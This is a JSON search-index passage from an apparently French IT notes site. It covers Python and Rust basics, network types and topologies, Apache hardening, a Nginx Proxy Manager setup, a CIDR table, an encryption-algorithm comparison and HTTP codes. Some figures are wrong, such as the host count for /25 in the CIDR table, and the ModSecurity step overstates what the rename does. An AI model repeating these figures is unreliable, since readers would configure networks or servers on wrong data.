</ul>"},{"location":"IT/Dev/Python/Bases/","title":"Bases","text":"<pre><code>print(\"Hello\")\n</code></pre>"},{"location":"IT/Dev/Python/Bases/#variables","title":"Variables","text":"<pre><code>greeting = 'Hello again'\nprint(greeting)\n</code></pre> <pre><code>a = 'coucou'\nb = 'world'\nprint(a, b)\n---\ncoucou world\n</code></pre> <pre><code>add = 10 + 10\nsub = 20 - 10\nmulti = 5 * 5\ndiv = 10 / 5\nprint(add, sub, multi, div)\n---\n20 10 25 2\n</code></pre> <pre><code>happy = 2\n\nif happy == 1:\n    print(\"Happy and we know it!\")\nelif happy == 2:\n    print(\"Excited about it!\")\nelse:\n    print(\"Not happy...\")\n</code></pre>"},{"location":"IT/Dev/Python/Bases/#boucle-while","title":"Boucle while","text":"<pre><code>counter = 0\n\nwhile counter &lt; 5:\n    print(f'Hello #{counter}')\n    counter = counter + 1\n</code></pre>"},{"location":"IT/Dev/Python/Bases/#list","title":"List","text":"<pre><code>groceries = ['Walnuts', 'Grapes', 'Bird seeds']\n\n# syntaxe alternative :\n\ngroceries = [\n    'Walnuts',    # index 0\n    'Grapes',     # index 1\n    'Bird seeds'  # index 2\n]\n</code></pre> <pre><code>var = \"ABCDEF\"\nprint(var[0], var[1], var[2], var[3], var[4], var[5])\n---\nA B C D E F\n\n\nprint(var[-1], var[-2], var[-3], var[-4], var[-5], var[-6])\n---\nF E D C B A\n</code></pre>"},{"location":"IT/Dev/Python/Bases/#boucle-for-each","title":"Boucle for each","text":"<pre><code>groceries = ['Walnuts', 'Grapes', 'Bird seeds']\n\nfor food in groceries:\n    print(f'I bought some {food} today.')\n\n---\nI bought some Walnuts today.\nI bought some Grapes today.\nI bought some Bird seeds today.\n</code></pre>"},{"location":"IT/Dev/Rust/Bases/","title":"Bases","text":""},{"location":"IT/Dev/Rust/Bases/#hello-world","title":"Hello world","text":"<pre><code>fn main() {\n    // Our main function does one task: show a message\n    // println! displays the input \"Hello, world!\" to the screen\n    println!(\"Hello, world!\");\n}\n</code></pre>"},{"location":"IT/Dev/Rust/Bases/#substitution","title":"Substitution","text":"<pre><code>fn main() {\n    // Call println! with three arguments: a string, a value, a value\n    println!(\"The first letter of the English alphabet is {} and the last letter is {}.\", 'A', 'Z');\n}\n</code></pre>"},{"location":"IT/Dev/Rust/Bases/#variables","title":"Variables","text":"<p>Immuable: <pre><code>// Declare a variable\nlet a_number;\n\n// Declare a second variable and bind the value\nlet a_word = \"Ten\";\n\n// Bind a value to the first variable\na_number = 10;\n\nprintln!(\"The number is {}.\", a_number);\nprintln!(\"The word is {}.\", a_word);\n</code></pre></p> <p>Mutable: <pre><code>// The `mut` keyword lets the variable be changed\nlet mut a_number = 10; \nprintln!(\"The number is {}.\", a_number);\n\n// Change the value of an immutable variable\na_number = 15;\nprintln!(\"Now the number is {}.\", a_number);\n</code></pre></p> <p>Mise en m\u00e9moire fant\u00f4me:</p> <pre><code>// Declare first variable binding with name \"shadow_num\"\nlet shadow_num = 5;\n\n// Declare second variable binding, shadows existing variable \"shadow_num\" \nlet shadow_num = shadow_num + 5; \n\n// Declare third variable binding, shadows second binding of variable \"shadow_num\"\nlet shadow_num = shadow_num * 2; \n\nprintln!(\"The number is {}.\", shadow_num);\n</code></pre>"},{"location":"IT/Dev/Rust/Bases/#typer-une-variable","title":"Typer une variable","text":"<pre><code>let number: u32 = 14;\nprintln!(\"The number is {}.\", number);\n</code></pre>"},{"location":"IT/Dev/Rust/Bases/#tuple","title":"Tuple","text":"<pre><code>// Declare a tuple of three elements\nlet tuple_e = ('E', 5i32, true);\n\n// Use tuple indexing and show the values of the elements in the tuple\nprintln!(\"Is '{}' the {}th letter of the alphabet? {}\", tuple_e.0, tuple_e.1, tuple_e.2);\n</code></pre>"},{"location":"IT/Dev/Rust/Bases/#struct","title":"Struct","text":"<pre><code>// Instantiate classic struct, specify fields in random order, or in specified order\nlet user_1 = Student { name: String::from(\"Constance Sharma\"), remote: true, level: 2 };\nlet user_2 = Student { name: String::from(\"Dyson Tan\"), level: 5, remote: false };\n\n// Instantiate tuple structs, pass values in same order as types defined\nlet mark_1 = Grades('A', 'A', 'B', 'A', 3.75);\nlet mark_2 = Grades('B', 'A', 'A', 'C', 3.25);\n\nprintln!(\"{}, level {}. Remote: {}. Grades: {}, {}, {}, {}. Average: {}\", user_1.name, user_1.level, user_1.remote, mark_1.0, mark_1.1, mark_1.2, mark_1.3, mark_1.4);\n\nprintln!(\"{}, level {}. Remote: {}. Grades: {}, {}, {}, {}. Average: {}\", user_2.name, user_2.level, user_2.remote, mark_2.0, mark_2.1, mark_2.2, mark_2.3, mark_2.4);\n</code></pre>"},{"location":"IT/R%C3%A9seaux/Les%20diff%C3%A9rents%20r%C3%A9seaux/","title":"Les diff\u00e9rents r\u00e9seaux","text":""},{"location":"IT/R%C3%A9seaux/Les%20diff%C3%A9rents%20r%C3%A9seaux/#le-pan-personal-area-network","title":"Le pan (Personal Area Network)","text":"<p>Le PAN permet d\u2019\u00e9changer des donn\u00e9es entre des appareils proches (g\u00e9n\u00e9ralement dans la m\u00eame pi\u00e8ce). Pour ce faire, il existe 2 techniques de transmission physique, l\u2019USB et le FireWire. Il est \u00e9galement possible de relier deux appareils via le WPAN (r\u00e9seau personnel sans fil) avec des technologiques comme l\u2019USB sans fil, le Bluetooth ou le Z-Wave.</p> <p>Il est \u00e9galement possible de relier un r\u00e9seau PAN vers d\u2019autres r\u00e9seaux plus grands.\u00a0</p>"},{"location":"IT/R%C3%A9seaux/Les%20diff%C3%A9rents%20r%C3%A9seaux/#le-lan-local-area-network","title":"Le lan (Local Area Network)","text":"<p>Si vous avez besoin de relier plusieurs ordinateurs sur un r\u00e9seau, vous cr\u00e9ez un LAN ou r\u00e9seau local. Pour ce faire, nous utilisons le plus souvent le protocole Ethernet.</p> <p>Pour connecter plus de 2 ordinateurs ensemble, il est n\u00e9cessaire d\u2019ajouter d\u2019autres \u00e9l\u00e9ments, comme un hub ou un commutateur r\u00e9seau. Ces \u00e9l\u00e9ments agissent comme des noeuds de distribution ou des \u00e9l\u00e9ments de couplage.\u00a0</p> <p>Le LAN permet de transmettre une grande quantit\u00e9 de donn\u00e9es rapidement. Celui-ci vous permet de partager des serveurs de fichiers, imprimantes ou encore des applications.\u00a0</p> <p>Il est \u00e9galement possible de se connecter via le WLAN (Wireless Local Area Network) ou r\u00e9seau local sans fil (Wifi).\u00a0</p> <p>Bien que les deux solutions soient possibles, l\u2019Ethernet offre plus de s\u00e9curit\u00e9 et un d\u00e9bit de donn\u00e9es plus important.</p>"},{"location":"IT/R%C3%A9seaux/Les%20diff%C3%A9rents%20r%C3%A9seaux/#le-man-metropolitan-area-network","title":"Le man (Metropolitan Area Network)","text":"<p>Le MAN permet de relier plusieurs LAN proches. Celui-ci permet d\u2019\u00e9changer tr\u00e8s rapidement des donn\u00e9es entre diff\u00e9rentes branches d\u2019une soci\u00e9t\u00e9 par exemple. En utilisant la fibre optique et des routeurs assez puissants, l\u2019\u00e9change de donn\u00e9es est plus rapide que via l\u2019internet.\u00a0</p>"},{"location":"IT/R%C3%A9seaux/Les%20diff%C3%A9rents%20r%C3%A9seaux/#le-wan-wide-area-network","title":"Le wan (Wide Area Network)","text":"<p>Le WAN permet de relier diff\u00e9rentes machines tr\u00e8s \u00e9loign\u00e9es (\u00e0 l\u2019\u00e9chelle d\u2019un continent). Pour ce faire, le WAN se base sur les technologies des adresses IP, de SDH ou encore des ATM.</p> <p>Les WAN sont souvent g\u00e9r\u00e9s par nos fournisseurs de services Internet.\u00a0</p>"},{"location":"IT/R%C3%A9seaux/Les%20diff%C3%A9rents%20r%C3%A9seaux/#le-gan-global-area-network","title":"Le gan (Global Area Network)","text":"<p>Basiquement, internet est un GAN, un r\u00e9seau mondial permettant d\u2019\u00e9changer des informations entre diff\u00e9rents appareils. Mais internet n\u2019est pas le seul GAN. De nombreuses entreprises utilisent un GAN pour relier diff\u00e9rents WAN ensemble. Les GAN utilisent des c\u00e2bles sous marins et des transmissions par satellite.</p>"},{"location":"IT/R%C3%A9seaux/OSI/","title":"OSI","text":"Layer Typical Use Protocols Applic\u00adation End User Layer HTTP, FTP, SSH, DNS Presen\u00adtation Syntax Layer SSL, SSH, IMAP, MPEG, JPEG Session Sync &amp; Send Layer APIs, Sockets Transport End-to-end Connec\u00adtions TCP, UDP Network Packets IP, ICMP, IPSec, IGMP Data Link Frames Ethernet, PPP, Switch Physical Physical Structure Fiber, Access Points, Copper Cabling"},{"location":"IT/R%C3%A9seaux/Topologies/","title":"Topologies","text":""},{"location":"IT/R%C3%A9seaux/Topologies/#anneau","title":"Anneau","text":"<p>Chaque n\u0153ud (ordinateur ou \u00e9quipement r\u00e9seau) est connect\u00e9 \u00e0 deux autres, formant ainsi un cycle ferm\u00e9. Les donn\u00e9es circulent d\u2019un n\u0153ud \u00e0 l\u2019autre dans le sens horaire ou antihoraire. L\u2019avantage est que la transmission peut \u00eatre fluide, mais la panne d\u2019un seul n\u0153ud (ou de son lien) peut interrompre la communication de tout l\u2019anneau.</p> <p></p>"},{"location":"IT/R%C3%A9seaux/Topologies/#bus","title":"Bus","text":"<p>Tous les ordinateurs sont reli\u00e9s \u00e0 un m\u00eame c\u00e2ble principal appel\u00e9 \u00ab\u202fbus\u202f\u00bb. Chaque message circule le long de ce c\u00e2ble et peut \u00eatre re\u00e7u par tous les appareils. Bien qu\u2019\u00e9conomique et simple \u00e0 mettre en place, cette topologie devient vite inefficace si le nombre de machines augmente ou si le c\u00e2ble unique tombe en panne.</p> <p></p>"},{"location":"IT/R%C3%A9seaux/Topologies/#etoile","title":"Etoile","text":"<p>Un dispositif central (commutateur, concentrateur, routeur) relie tous les n\u0153uds entre eux. Les donn\u00e9es passent donc par ce point central. Cette topologie est tr\u00e8s r\u00e9pandue, car elle facilite la maintenance et l\u2019identification des pannes, bien qu\u2019elle d\u00e9pende fortement de la fiabilit\u00e9 de l\u2019\u00e9quipement central. </p> <p></p>"},{"location":"IT/R%C3%A9seaux/Topologies/#maille","title":"Maill\u00e9","text":"<p>Chaque n\u0153ud est potentiellement connect\u00e9 \u00e0 tous les autres. Elle offre une grande redondance\u202f: si un lien tombe en panne, les donn\u00e9es peuvent emprunter un autre chemin. En contrepartie, elle peut se r\u00e9v\u00e9ler co\u00fbteuse \u00e0 d\u00e9ployer et plus complexe \u00e0 g\u00e9rer, car elle n\u00e9cessite un grand nombre de connexions.</p> <p></p>"},{"location":"IT/Services/Mise%20en%20place%20serveur%20Apache/","title":"Mise en place serveur Apache","text":""},{"location":"IT/Services/Mise%20en%20place%20serveur%20Apache/#mise-en-place-securisee-dun-serveur-apache-sur-debian","title":"Mise en place s\u00e9curis\u00e9e d\u2019un serveur Apache sur Debian","text":""},{"location":"IT/Services/Mise%20en%20place%20serveur%20Apache/#installation-dapache","title":"Installation d\u2019Apache","text":"<p>Avant d\u2019installer Apache, assurez-vous que votre syst\u00e8me est \u00e0 jour :</p> <pre><code>sudo apt update &amp;&amp; sudo apt upgrade -y\n</code></pre> <p>Puis installez Apache :</p> <pre><code>sudo apt install apache2 -y\n</code></pre> <p>V\u00e9rifiez que le service est bien d\u00e9marr\u00e9 :</p> <pre><code>sudo systemctl status apache2\n</code></pre> <p>Activez Apache au d\u00e9marrage :</p> <pre><code>sudo systemctl enable apache2\n</code></pre>"},{"location":"IT/Services/Mise%20en%20place%20serveur%20Apache/#securisation-de-la-configuration-dapache","title":"S\u00e9curisation de la configuration d\u2019Apache","text":""},{"location":"IT/Services/Mise%20en%20place%20serveur%20Apache/#desactiver-les-informations-sensibles","title":"D\u00e9sactiver les informations sensibles","text":"<p>Par d\u00e9faut, Apache affiche sa version et d\u2019autres informations qui pourraient \u00eatre utilis\u00e9es pour une attaque. Modifiez le fichier de configuration principal :</p> <pre><code>sudo nano /etc/apache2/conf-available/security.conf\n</code></pre> <p>Assurez-vous que les lignes suivantes sont bien pr\u00e9sentes et d\u00e9comment\u00e9es :</p> <pre><code>ServerTokens Prod\nServerSignature Off\nTraceEnable Off\nFileETag None\n</code></pre> <p>Appliquez les modifications :</p> <pre><code>sudo systemctl restart apache2\n</code></pre>"},{"location":"IT/Services/Mise%20en%20place%20serveur%20Apache/#restreindre-lacces-aux-repertoires","title":"Restreindre l\u2019acc\u00e8s aux r\u00e9pertoires","text":"<p>Dans le fichier <code>/etc/apache2/apache2.conf</code>, localisez la section <code>&lt;Directory /&gt;</code> et modifiez-la comme suit :</p> <pre><code>&lt;Directory /&gt;\n    Options None\n    AllowOverride None\n    Require all denied\n&lt;/Directory&gt;\n</code></pre> <p>Cela emp\u00eache l\u2019acc\u00e8s aux r\u00e9pertoires syst\u00e8me et r\u00e9duit la surface d\u2019attaque.</p>"},{"location":"IT/Services/Mise%20en%20place%20serveur%20Apache/#activer-les-modules-de-securite","title":"Activer les modules de s\u00e9curit\u00e9","text":"<p>Activez les modules suivants pour renforcer la s\u00e9curit\u00e9 d\u2019Apache :</p> <pre><code>sudo a2enmod headers rewrite ssl security2\n</code></pre> <p>Ajoutez des en-t\u00eates de s\u00e9curit\u00e9 dans <code>/etc/apache2/conf-available/security.conf</code> :</p> <pre><code>Header always set X-Frame-Options \"DENY\"\nHeader always set X-XSS-Protection \"1; mode=block\"\nHeader always set X-Content-Type-Options \"nosniff\"\nHeader always set Referrer-Policy \"strict-origin-when-cross-origin\"\nHeader always set Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none';\"\n</code></pre> <p>Appliquez les changements :</p> <pre><code>sudo systemctl restart apache2\n</code></pre>"},{"location":"IT/Services/Mise%20en%20place%20serveur%20Apache/#configuration-https-avec-lets-encrypt","title":"Configuration HTTPS avec Let\u2019s Encrypt","text":"<p>Installez Certbot et le module Apache correspondant :</p> <pre><code>sudo apt install certbot python3-certbot-apache -y\n</code></pre> <p>G\u00e9n\u00e9rez un certificat SSL :</p> <pre><code>sudo certbot --apache\n</code></pre> <p>Suivez les instructions et assurez-vous que la redirection HTTP vers HTTPS est activ\u00e9e. V\u00e9rifiez l\u2019automatisation du renouvellement :</p> <pre><code>sudo certbot renew --dry-run\n</code></pre> <p>Ajoutez un cron job pour renouveler automatiquement les certificats :</p> <pre><code>echo \"0 3 * * * certbot renew --quiet\" | sudo tee /etc/cron.d/certbot-renew\n</code></pre>"},{"location":"IT/Services/Mise%20en%20place%20serveur%20Apache/#protection-contre-les-attaques-courantes","title":"Protection contre les attaques courantes","text":""},{"location":"IT/Services/Mise%20en%20place%20serveur%20Apache/#protection-contre-les-attaques-dos-mod_evasive","title":"Protection contre les attaques DoS (mod_evasive)","text":"<p>Installez le module :</p> <pre><code>sudo apt install libapache2-mod-evasive -y\n</code></pre> <p>\u00c9ditez son fichier de configuration :</p> <pre><code>sudo nano /etc/apache2/mods-available/evasive.conf\n</code></pre> <p>Ajoutez les lignes suivantes :</p> <pre><code>DOSHashTableSize    2048\nDOSPageCount        10\nDOSSiteCount        50\nDOSBlockingPeriod   600\nDOSLogDir           \"/var/log/mod_evasive\"\n</code></pre> <p>Cr\u00e9ez le r\u00e9pertoire des logs et donnez-lui les bonnes permissions :</p> <pre><code>sudo mkdir -p /var/log/mod_evasive\nsudo chown -R www-data:www-data /var/log/mod_evasive\n</code></pre> <p>Red\u00e9marrez Apache :</p> <pre><code>sudo systemctl restart apache2\n</code></pre>"},{"location":"IT/Services/Mise%20en%20place%20serveur%20Apache/#protection-contre-les-injections-sql-et-xss-mod_security","title":"Protection contre les injections SQL et XSS (mod_security)","text":"<p>Installez ModSecurity :</p> <pre><code>sudo apt install libapache2-mod-security2 -y\n</code></pre> <p>Activez la r\u00e8gle Core Rule Set (CRS) :</p> <pre><code>sudo mv /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf\n</code></pre> <p>Activez ModSecurity :</p> <pre><code>sudo a2enmod security2\nsudo systemctl restart apache2\n</code></pre>"},{"location":"IT/Services/Mise%20en%20place%20serveur%20Apache/#journalisation-et-surveillance","title":"Journalisation et surveillance","text":""},{"location":"IT/Services/Mise%20en%20place%20serveur%20Apache/#configurer-la-journalisation-des-acces-et-erreurs","title":"Configurer la journalisation des acc\u00e8s et erreurs","text":"<p>Les logs d\u2019Apache se trouvent par d\u00e9faut dans :</p> <ul> <li><code>/var/log/apache2/access.log</code> (journal des acc\u00e8s)</li> <li><code>/var/log/apache2/error.log</code> (journal des erreurs)</li> </ul> <p>Pour surveiller les tentatives suspectes, utilisez :</p> <pre><code>sudo tail -f /var/log/apache2/access.log\n</code></pre>"},{"location":"IT/Services/Mise%20en%20place%20serveur%20Apache/#installer-fail2ban-pour-bloquer-les-ip-malveillantes","title":"Installer Fail2Ban pour bloquer les IP malveillantes","text":"<p>Installez Fail2Ban :</p> <pre><code>sudo apt install fail2ban -y\n</code></pre> <p>Ajoutez un filtre Apache :</p> <pre><code>sudo nano /etc/fail2ban/jail.local\n</code></pre> <p>Ajoutez la configuration suivante :</p> <pre><code>[apache-auth]\nenabled = true\nport = http,https\nlogpath = /var/log/apache2/error.log\nmaxretry = 10\n</code></pre> <p>Activez Fail2Ban :</p> <pre><code>sudo systemctl restart fail2ban\n</code></pre> <p>Pour voir les IP bannies :</p> <pre><code>sudo fail2ban-client status apache-auth\n</code></pre>"},{"location":"IT/Services/Nginx%20Proxy%20Manager/","title":"Nginx Proxy Manager","text":""},{"location":"IT/Services/Nginx%20Proxy%20Manager/#installation-de-npm-sur-un-conteneur-alpine","title":"\ud83d\ude80 Installation de NPM sur un conteneur Alpine","text":"<pre><code>apk update\napk upgrade\napk add docker-compose\n</code></pre> <pre><code>mkdir ~/nginx-proxy-manager &amp;&amp; cd ~/nginx-proxy-manager\n</code></pre> <p>On cr\u00e9e ensuite le fichier Docker-compose.yml :</p> <pre><code>services:\n  app:\n    image: 'docker.io/jc21/nginx-proxy-manager:latest'\n    restart: unless-stopped\n    ports:\n      - '80:80'\n      - '81:81'\n      - '443:443'\n    volumes:\n      - ./data:/data\n      - ./letsencrypt:/etc/letsencrypt\n</code></pre> <pre><code>mkdir -p data/nginx/{client_body_temp,proxy_temp,fastcgi_temp}\nsudo chown -R 1000:1000 data/nginx\nmkdir -p letsencrypt\nsudo chown -R 1000:1000 letsencrypt\n</code></pre> <pre><code>docker-compose up -d\n</code></pre> <p>On va sur http://$ip:81</p> <p>Les credentials par d\u00e9faut sont : </p> <pre><code>Email:    admin@example.com\nPassword: changeme\n</code></pre>"},{"location":"Misc/CIDR/","title":"CIDR","text":"Longueur CIDR Masque Nombre de r\u00e9seaux H\u00f4tes /1 128.0.0.0 128 A 2,147,483,392 /2 192.0.0.0 64 A 1,073,741,696 /3 224.0.0.0 32 A 536,870,848 /4 240.0.0.0 16 A 268,435,424 /5 248.0.0.0 8 A 134,217,712 /6 252.0.0.0 4 A 67,108,856 /7 254.0.0.0 2 A 33,554,428 /8 255.0.0.0 1 A 16,777,214 /9 255.128.0.0 128 B 8,388,352 /10 255.192.0.0 64 B 4,194,176 /11 255.224.0.0 32 B 2,097,088 /12 255.240.0.0 16 B 1,048,544 /13 255.248.0.0 8 B 524,272 /14 255.252.0.0 4 B 262,136 /15 255.254.0.0 2 B 131,068 /16 255.255.0.0 1 B 65,534 /17 255.255.128.0 128 C 32,512 /18 255.255.192.0 64 C 16,256 /19 255.255.224.0 32 C 8,128 /20 255.255.240.0 16 C 4,064 /21 255.255.248.0 8 C 2,032 /22 255.255.252.0 4 C 1,016 /23 255.255.254.0 2 C 508 /24 255.255.255.0 1 C 254 /25 255.255.255.128 2 sous-r\u00e9seaux 124 /26 255.255.255.192 4 sous-r\u00e9seaux 62 /27 255.255.255.224 8 sous-r\u00e9seaux 30 /28 255.255.255.240 16 sous-r\u00e9seaux 14 /29 255.255.255.248 32 sous-r\u00e9seaux 6 /30 255.255.255.252 64 sous-r\u00e9seaux 2 /31 255.255.255.254 Aucun Aucun /32 255.255.255.255 1/256 C 1"},{"location":"Misc/CIDR/#les-classes-non-routables","title":"Les classes non routables","text":"<p>10.0.0.0 \u00e0 10.255.255.255 (10.0.0.0/8) 172.16.0.0 \u00e0 172.31.255.255 (172.16.0.0/12) 192.168.0.0 \u00e0 192.168.255.255 (192.168.0.0/16) 127.0.0.0 \u00e0 127.255.255.255 (LoopBack 127.0.0.0/8) 169.254.0.0 \u00e0 169.254.255.255 (APIPA 169.254.0.0/16) 224.0.0.0 \u00e0 239.255.255.255 (Multicast 224.0.0.0/4) 100.64.0.0 \u00e0 100.127.255.255 (CGN RFC6598 100.64.0.0/10)</p>"},{"location":"Misc/Chiffrements/","title":"Chiffrements","text":"Algorithme Type Description Taille de cl\u00e9 Usages courants Avantages Limites AES (Advanced Encryption Standard) Sym\u00e9trique Chiffrement de bloc standardis\u00e9 par le NIST, utilis\u00e9 pour le chiffrement s\u00e9curis\u00e9 de donn\u00e9es dans des applications modernes. 128, 192, 256 bits - Chiffrement des donn\u00e9es (fichiers, disques, VPN)- Protocole TLS/SSL- Wi-Fi (WPA2). - Hautement s\u00e9curis\u00e9- Tr\u00e8s performant avec des impl\u00e9mentations optimis\u00e9es mat\u00e9riellement (ex : AES-NI). - Vuln\u00e9rable aux attaques par canal auxiliaire si mal impl\u00e9ment\u00e9.- N\u00e9cessite un \u00e9change s\u00e9curis\u00e9 de cl\u00e9. DES (Data Encryption Standard) Sym\u00e9trique Ancien standard de chiffrement par bloc, obsol\u00e8te aujourd'hui \u00e0 cause de sa faible taille de cl\u00e9 et de vuln\u00e9rabilit\u00e9s aux attaques par force brute. 56 bits - Anciennement utilis\u00e9 dans les transactions financi\u00e8res. - Rapide dans des environnements contraints en ressources. - Insecure en raison de sa faible taille de cl\u00e9. 3DES (Triple DES) Sym\u00e9trique Extension de DES avec trois passes successives pour renforcer la s\u00e9curit\u00e9. 168 bits (effectifs : 112 bits) - Utilis\u00e9 dans certaines transactions bancaires (encore support\u00e9 pour des syst\u00e8mes l\u00e9gataires). - Plus s\u00e9curis\u00e9 que DES. - Lent et moins efficace que des algorithmes modernes comme AES. Blowfish Sym\u00e9trique Algorithme de chiffrement de bloc con\u00e7u pour \u00eatre une alternative s\u00e9curis\u00e9e \u00e0 DES. 32 \u00e0 448 bits - Chiffrement de fichiers- VPN- Stockage de mots de passe. - Flexible en termes de taille de cl\u00e9- Plus rapide que 3DES. - Susceptible aux attaques de cl\u00e9 faible pour des impl\u00e9mentations sp\u00e9cifiques. Twofish Sym\u00e9trique Successeur de Blowfish, optimis\u00e9 pour les processeurs modernes, utilis\u00e9 dans certains logiciels libres de chiffrement. 128, 192, 256 bits - TrueCrypt (maintenant VeraCrypt)- Stockage de donn\u00e9es s\u00e9curis\u00e9. - S\u00e9curis\u00e9 et rapide avec une cl\u00e9 de 256 bits. - Moins largement adopt\u00e9 que AES. RC4 (Rivest Cipher 4) Sym\u00e9trique (flux) Algorithme de chiffrement \u00e0 flux rapide et simple, autrefois utilis\u00e9 dans des protocoles comme SSL et WEP, mais d\u00e9sormais consid\u00e9r\u00e9 comme peu s\u00fbr. Variable (40 \u00e0 2048 bits) - Anciennement utilis\u00e9 pour le chiffrement dans SSL, WEP, et RDP. - Rapide et facile \u00e0 impl\u00e9menter. - Vuln\u00e9rable \u00e0 de nombreuses attaques modernes.- Ne doit plus \u00eatre utilis\u00e9 dans des syst\u00e8mes s\u00e9curis\u00e9s. ChaCha20 Sym\u00e9trique (flux) Algorithme de chiffrement \u00e0 flux con\u00e7u pour \u00eatre plus rapide et s\u00e9curis\u00e9 que RC4, utilis\u00e9 dans des environnements o\u00f9 AES est trop lent. 256 bits - Protocole TLS/SSL- VPNs- Mobile (ex : Google). - Tr\u00e8s rapide, m\u00eame sur des appareils \u00e0 faible performance (mobile). - Moins utilis\u00e9 que AES, mais en expansion dans des environnements modernes. RSA Asym\u00e9trique Algorithme de chiffrement \u00e0 cl\u00e9 publique bas\u00e9 sur la factorisation de grands nombres premiers, utilis\u00e9 pour le chiffrement et les signatures num\u00e9riques. 1024, 2048, 4096 bits - Chiffrement des emails (PGP)- TLS/SSL- Signatures num\u00e9riques. - Tr\u00e8s s\u00e9curis\u00e9 avec de grandes tailles de cl\u00e9 (&gt;= 2048 bits). - Lent pour le chiffrement de gros volumes de donn\u00e9es.- Vuln\u00e9rable \u00e0 des attaques quantiques \u00e0 terme. ECC (Elliptic Curve Cryptography) Asym\u00e9trique Utilise des courbes elliptiques pour offrir une s\u00e9curit\u00e9 \u00e9quivalente \u00e0 RSA avec des cl\u00e9s beaucoup plus petites. 256 bits (\u00e9quivalent \u00e0 RSA-3072) - Cryptographie mobile- Protocole TLS/SSL- Cryptomonnaies. - Tr\u00e8s efficace, avec des tailles de cl\u00e9 plus petites que RSA. - Plus complexe \u00e0 impl\u00e9menter correctement.- Vuln\u00e9rabilit\u00e9s possibles si mal configur\u00e9. ElGamal Asym\u00e9trique Bas\u00e9 sur le probl\u00e8me du logarithme discret, utilis\u00e9 principalement pour les signatures num\u00e9riques et le chiffrement. Variable - Cryptographie \u00e0 cl\u00e9 publique- Utilis\u00e9 dans certaines impl\u00e9mentations de PGP et GPG. - Flexibilit\u00e9 des tailles de cl\u00e9 et bon niveau de s\u00e9curit\u00e9. - Lent et g\u00e9n\u00e8re des donn\u00e9es chiffr\u00e9es plus volumineuses que RSA. Diffie-Hellman Asym\u00e9trique Permet l'\u00e9change de cl\u00e9s s\u00e9curis\u00e9 entre deux parties, utilis\u00e9 pour \u00e9tablir un secret partag\u00e9 sur un canal non s\u00e9curis\u00e9. Variable (g\u00e9n\u00e9ralement 2048 bits) - \u00c9change de cl\u00e9s dans des protocoles comme TLS/SSL et IPsec. - Permet un \u00e9change s\u00e9curis\u00e9 de cl\u00e9 sur des canaux non s\u00e9curis\u00e9s. - Vuln\u00e9rable \u00e0 certaines attaques si des tailles de cl\u00e9 trop petites sont utilis\u00e9es. DSA (Digital Signature Algorithm) Asym\u00e9trique (signatures) Algorithme utilis\u00e9 pour g\u00e9n\u00e9rer des signatures num\u00e9riques, bas\u00e9 sur le probl\u00e8me du logarithme discret. 1024, 2048, 3072 bits - Signatures num\u00e9riques (ex : e-Gouvernement, SSL/TLS). - S\u00e9curis\u00e9 et largement utilis\u00e9 pour les signatures num\u00e9riques. - Plus lent que RSA pour la v\u00e9rification de signatures. Camellia Sym\u00e9trique Algorithme de chiffrement par bloc con\u00e7u pour \u00eatre aussi s\u00e9curis\u00e9 et rapide qu'AES, utilis\u00e9 principalement en Asie. 128, 192, 256 bits - Chiffrement dans des r\u00e9seaux mobiles et des applications de stockage de donn\u00e9es s\u00e9curis\u00e9es. - Efficace sur du mat\u00e9riel limit\u00e9, comparable \u00e0 AES. - Moins adopt\u00e9 \u00e0 l\u2019international qu\u2019AES. Serpent Sym\u00e9trique Finaliste du concours AES, con\u00e7u pour une s\u00e9curit\u00e9 maximale, souvent utilis\u00e9 lorsque la performance est moins critique. 128, 192, 256 bits - Applications n\u00e9cessitant un haut niveau de s\u00e9curit\u00e9. - Tr\u00e8s s\u00e9curis\u00e9 contre les attaques cryptographiques connues. - Moins rapide qu'AES, ce qui le rend moins attractif pour des applications exigeant des performances \u00e9lev\u00e9es. IDEA (International Data Encryption Algorithm) Sym\u00e9trique Algorithme de chiffrement par bloc anciennement utilis\u00e9 dans PGP, avec une s\u00e9curit\u00e9 reconnue. 128 bits - Chiffrement d'emails et de fichiers (notamment dans PGP). - S\u00e9curis\u00e9 et efficace avec une taille de cl\u00e9 fixe de 128 bits. - Moins utilis\u00e9 depuis l'introduction d'AES.- Brevet\u00e9, limitant son adoption. CAST-128 Sym\u00e9trique Algorithme utilis\u00e9 dans certains syst\u00e8mes de chiffrement (ex : GPG, certains VPNs). 40 \u00e0 128 bits - Chiffrement de fichiers et communications.- VPN. - S\u00e9curis\u00e9 et flexible en termes de taille de cl\u00e9. - Moins s\u00e9curis\u00e9 que des algorithmes comme AES avec de petites tailles de cl\u00e9. GOST (\u0413\u041e\u0421\u0422) Sym\u00e9trique Algorithme de chiffrement par bloc d\u00e9velopp\u00e9 en Russie, utilis\u00e9 dans certaines normes locales et syst\u00e8mes l\u00e9gataires. 256 bits - Utilis\u00e9 principalement dans des applications russes et post-sovi\u00e9tiques. - S\u00e9curit\u00e9 reconnue dans certains contextes r\u00e9glement\u00e9s. - Moins audit\u00e9 que AES ou des standards internationaux.- Peu adopt\u00e9 \u00e0 l'international. XOR (eXclusive OR) Sym\u00e9trique Algorithme de chiffrement basique qui combine les bits des donn\u00e9es et de la cl\u00e9 en utilisant l'op\u00e9rateur logique XOR. Variable - Chiffrement simple pour des fichiers ou des flux de donn\u00e9es de faible sensibilit\u00e9. - Tr\u00e8s simple \u00e0 impl\u00e9menter et rapide. - Inutile contre les attaques modernes (si la cl\u00e9 est courte ou r\u00e9utilis\u00e9e)."},{"location":"Misc/Code%20HTTP/","title":"Code HTTP","text":"Code Cat\u00e9gorie Signification 100 Informationnelle Continue : Le client peut continuer sa requ\u00eate. 101 Informationnelle Switching Protocols : Le serveur accepte de changer de protocole. 102 Informationnelle Processing : Le serveur traite la requ\u00eate, mais aucune r\u00e9ponse n'est disponible. 200 Succ\u00e8s OK : La requ\u00eate a r\u00e9ussi. 201 Succ\u00e8s Created : La ressource a \u00e9t\u00e9 cr\u00e9\u00e9e avec succ\u00e8s. 202 Succ\u00e8s Accepted : La requ\u00eate a \u00e9t\u00e9 accept\u00e9e mais n'est pas encore trait\u00e9e. 203 Succ\u00e8s Non-Authoritative Information : La r\u00e9ponse contient des informations non officielles. 204 Succ\u00e8s No Content : La requ\u00eate a r\u00e9ussi, mais il n'y a pas de contenu \u00e0 envoyer. 205 Succ\u00e8s Reset Content : Le serveur indique de r\u00e9initialiser la vue du document. 206 Succ\u00e8s Partial Content : R\u00e9ponse partielle, souvent 